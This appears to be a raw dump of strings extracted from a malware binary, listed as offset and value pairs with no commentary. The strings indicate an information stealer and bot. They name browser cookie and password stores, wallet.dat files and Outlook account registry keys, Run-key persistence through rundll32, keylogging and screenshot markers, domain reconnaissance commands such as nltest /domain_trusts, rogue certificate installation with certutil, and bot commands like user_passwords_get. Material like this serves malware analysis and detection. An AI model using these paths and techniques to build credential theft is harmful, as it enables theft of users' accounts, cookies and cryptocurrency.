6aaa8,".txt"
6aab2,".docx"
6aabe,".xls"
6aad0,"wallet.dat"
689de,".tmp"
6a640,"Started \""
68944,"\"."
6a620,"firefox.exe"
6a620,"firefox.exe"
6a6e0,"Finish \""
68944,"\"."
6a6cc,"Firefox"
68590,"\Mozilla\Firefox\Profiles"
681fa,"\*"
6a5b0,"cookies.sqlite"
6a5d0,"Firefox cookies was not found, \""
68944,"\"."
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
68950,"chrome.exe"
6a640,"Started \""
68944,"\"."
68950,"chrome.exe"
6a6e0,"Finish \""
68944,"\"."
689d0,"Chrome"
68c42,".dll"
68c50,"\"%s\",DllRegisterServer"
68c80,"rundll32.exe"
6aa90,"*wallet.dat"
688a0,"\Google\Chrome\User Data"
681fa,"\*"
6a6f2,"Cookies"
6a710,"Chrome cookies was not found, \""
68944,"\"."
68602,"\"
696ca,"\n"
69aa0,"C:\Windows\SystemApps\*"
69ad0,"Microsoft.MicrosoftEdge"
689de,".tmp"
68eb0,"[VK_BACK]"
689de,".tmp"
6a4ba,"*.txt"
6a4d0,"*.cookie"
6a4f0,"iexplore.exe"
6a50a,"Low"
6a520,"Internet Explorer"
68200,"tmp"
68210,"%s%08x.%s"
68ed0,"Software\Microsoft\"
68c9a,".exe"
68cb0,"rundll32.exe \"%s\",DllRegisterServer"
69110,"rundll32.exe %s,DllRegisterServer"
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
690b0,"Software\Microsoft\Windows\CurrentVersion\Run"
68c9a,".exe"
68c42,".dll"
68c9a,".exe"
692ce," >> "
68602,"\"
68602,"\"
68450,"%s\mozilla\firefox\profiles\*"
68490,"%s\mozilla\firefox\profiles\%s\cache2\entries"
696e0,"Software\Microsoft\Internet Account Manager\Accounts"
69750,"Identities"
696e0,"Software\Microsoft\Internet Account Manager\Accounts"
69766,"Outlook"
69780,"Software\Microsoft\Internet Account Manager"
697e0,"\Accounts"
69800,"Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts"
69880,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings"
69970,"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook"
69a30,"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook"
69766,"Outlook"
68520,"ntdll.dll"
6a8c0,"user32.dll"
696c4,": "
696ca,"\n"
696c4,": "
696ca,"\n"
696c4,": "
696ca,"\n"
696ca,"\n"
696c4,": "
696d0,"%u"
6857c,".crt"
68590,"\Mozilla\Firefox\Profiles"
685d0,"cert9.db"
685f0,"cert8.db"
6aed0,"\Google\Chrome\User Data\Local State"
691a0,"Software\Microsoft"
68c9a,".exe"
691a0,"Software\Microsoft"
6a620,"firefox.exe"
6af34,"DISPLAY"
6af50,"image/jpeg"
69160,"HideClass"
69180,"HideWindow"
69160,"HideClass"
6ae86,"AES"
6ae90,"ChainingModeGCM"
6aeb0,"ChainingMode"
691c6,"UNKNOWN"
691e0,"Software\Microsoft\Windows NT\CurrentVersion"
69240,"InstallDate"
69260,"DigitalProductId"
69290,"%s_%08X%08X"
692b0,"INVALID_BOT_ID"
691a0,"Software\Microsoft"
6a810,"explorer.exe"
6a4f0,"iexplore.exe"
6a620,"firefox.exe"
68950,"chrome.exe"
6ab60,"cmd.exe /c ipconfig /all"
6aba0,">> ipconfig /all\n"
6abc4,"\n\n"
6abd0,"cmd.exe /c net config workstation"
6ac20,">> net config workstation\n\n"
6abc4,"\n\n"
6ac60,"cmd.exe /c net view /all"
6aca0,">> net view /all\n\n"
6abc4,"\n\n"
6acd0,"cmd.exe /c net view /all /domain"
6ad20,">> net view /all /domain\n\n"
6abc4,"\n\n"
6ad60,"cmd.exe /c nltest /domain_trusts"
6adb0,"nltest /domain_trusts\n"
6abc4,"\n\n"
6ade0,"cmd.exe /c nltest /domain_trusts /all_trusts"
6ae40,"nltest /domain_trusts /all_trusts\n"
6a950,"Unknown-Title"
6a96c,"\n"
6a970,"	"
6aa00,"%s\System32\kernelbase.dll"
68520,"ntdll.dll"
6aaf0,"Windows\"
6ab10,"Program Files\"
6ab30,"Program Files (x86)\"
68950,"chrome.exe"
6a4f0,"iexplore.exe"
6a810,"explorer.exe"
68244,"Global\"
68ed0,"Software\Microsoft\"
68e10,"SYSTEM\CurrentControlSet\Control\TimeZoneInformation"
68e80,"TimeZoneKeyName"
68ea0,"Unknown"
68ed0,"Software\Microsoft\"
68ed0,"Software\Microsoft\"
68630,"\certutil.exe"
685d0,"cert9.db"
686b0,"\"%s\" -A -n \"%s\" -t \"C,C,C\" -i \"%s\" -d sql:\"%s\""
68520,"ntdll.dll"
68602,"\"
68610,"\prefs.js"
68254,"%s|"
68b10,"user_execute"
68b30,"bot_uninstall"
68b50,"user_cookies_get"
68b80,"user_cookies_remove"
68bb0,"user_passwords_get"
68be0,"user_files_get"
68c00,"user_url_block"
68c20,"user_url_unblock"
68950,"chrome.exe"
689d0,"Chrome"
688a0,"\Google\Chrome\User Data"
681fa,"\*"
688e0,"Login Data"
68900,"Chrome passwords was not found, \""
68944,"\"."
689de,".tmp"
68500,"\mshtml.dll"
68520,"ntdll.dll"
683e0,"\Google\Chrome\User Data\Default\Cache"
68430,"%s\index"
68232,"*"
68850,"Grabbed data from: %s\n\n%S"
68810,"Url: %s\n"
68822,"%S"
68830,"Data: %S"
682b0,"SeSecurityPrivilege"
68280,"S:(ML;;NRNWNX;;;LW)"
681fa,"\*"
68280,"S:(ML;;NRNWNX;;;LW)"
681fa,"\*"
68266,"\"%s\" %s"
6825c,"\"%s\""
681f2,"0:0"
